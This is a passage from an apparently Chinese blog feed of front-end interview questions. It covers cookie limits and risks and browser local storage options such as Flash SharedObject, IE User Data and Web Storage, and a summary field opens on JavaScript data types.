cookie 中的 session 对象的大小。<br>6) 通过加密和安全传输技术（ SSL ），减少 cookie 被破解的可能性。<br>7) 只在 cookie 中存放不敏感数据，即使被盗也不会有重大损失。<br><!--more--><br><strong>缺点</strong>：<br>1) Cookie 数量和长度的限制 。<br>数量：每个域的 cookie 总数有限。<br>a) IE6 或更低版本最多 20 个 cookie<br>b) IE7 和之后的版本最后可以有 50 个 cookie<br>c) Firefox 最多 50 个 cookie<br>d) chrome 和 Safari 没有做硬性限制<br>长度：每个 cookie 长度不超过 4KB （ 4096B ），否则会被截掉。<br>2) 潜在的安全风险 。 Cookie 可能被拦截、篡改。如果 cookie 被拦截，就有可能取得所有的 session 信息。<br>3) 用户配置为禁用 。有些用户禁用了浏览器或客户端设备接受 cookie 的能力，因此限制了这一功能。<br>4) 有些状态不可能保存在客户端 。例如，为了防止重复提交表单，我们需要在服务器端保存一个计数器。如果我们把这个计数器保存在客户端，那么它起不到任何作用。</p><blockquote><p>三十六、简单说一下浏览器本地存储是怎样的</p></blockquote><p>1)Cookie ： 广泛应用，局限明显。支持数据存储量相对较少，每个 domain 最多只能有 20 条 cookie ，每个 cookie 长度不能超过 4KB ，否则会被截掉；同时，存在安全性问题，如果被拦截，就可以取得所有的 session 信息。<br>2)Flash SharedObject ：使用的是 kissy 的 store 模块来调用 Flash SharedObject 。<br>优点：容量适中，基本上不存在兼容性问题<br>缺点：要在页面中引入特定的 Flash 和 JS ，增加额外负担，处理繁琐；还是有部分机子没有 flash 运行环境。<br>3)Google Gears ： Google 的离线方案，已经停止更新，官方推荐使用 HTML5 的 localStorage 方案。<br>4)User Data ： 是微软为 IE 专门在系统中开辟的一块存储空间，只支持 Windows+IE 的组合。单个文件的大小限制是 128KB ，一个域名下总共可以保存 1024KB 的文件，文件个数应该没有限制。在受限站点里这两个值分别是 64KB 和 640KB 。<br>（所以如果考虑到各种情况的话，单个文件最好能控制 64KB 以下。）<br>（实际测试 2000 （ IE5.5 ）、 XP （ IE6 、 IE7 ）， Vista （ IE7 ）下都是可正常使用。）<br>5)Web Storage<br>在较高版本的浏览器中，JS 提供了 sessionStorage 和 globalStorage 。<br>在 HTML5 中提供了 sessionStorage 和 localStorage 。<br>sessionStorage 用于本地存储一个会话（ session ）中的数据，这些数据只有在同一个会话中的页面才能访问，会话结束后数据随之销毁。因此 sessionStorage 不是一种持久化的本地存储，仅仅是会话级别的存储。<br>globalStorage 跨越会话存储数据。有特定访问限制，要指定哪些域可访问该数据。<br>localStorage 用于持久化的本地存储，除非主动删除数据，否则数据是永远不会过期的。不能给 localStorage 指定任何规则，要访问同一个 localStorage ，页面必须使用同一个域名，使用同一种协议，在同一个端口上。<br>优点：容量大、易用、强大、原生支持<br>缺点： a) 兼容性差（ Chrome,  Safari, Firefox,Opera,IE8+ 支持 ， IE8 以下版本不支持）<br>b) 安全性差（所以请勿使用 localStorage 保存敏感信息）</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;（方方-必考）一、介绍js的基本数据类型。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;code&gt;Undefined、Null、Boolean、Number、String、&lt;/code&gt;&lt;br&gt;ECMAScript 2015 新增:&lt;code&gt;Symbol&lt;/code&gt; (创建后独一无二且不可变的数据类型 )&lt;br&gt;一旦出现（数组、函数、正则、日期、NaN）直接0分&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;二、介绍js有哪些内置对象？&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Object 是 JavaScript 中所有对象的父对象&lt;/p&gt;
&lt;p&gt;数据封装类对象：&lt;code&gt;Object、Array、Boolean、Number 和 String&lt;/code&gt;&lt;br&gt;其他对象：&lt;code&gt;Function、Arguments、Math、Date、RegExp、Error&lt;/code&gt;&lt;br&gt;&lt;a href=&quot;https://www.ibm.com/developerworks/cn/web/wa-objectsinjs-v1b/index.html&quot;&gt;了解 JavaScript 中的内置对象&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
</feed>
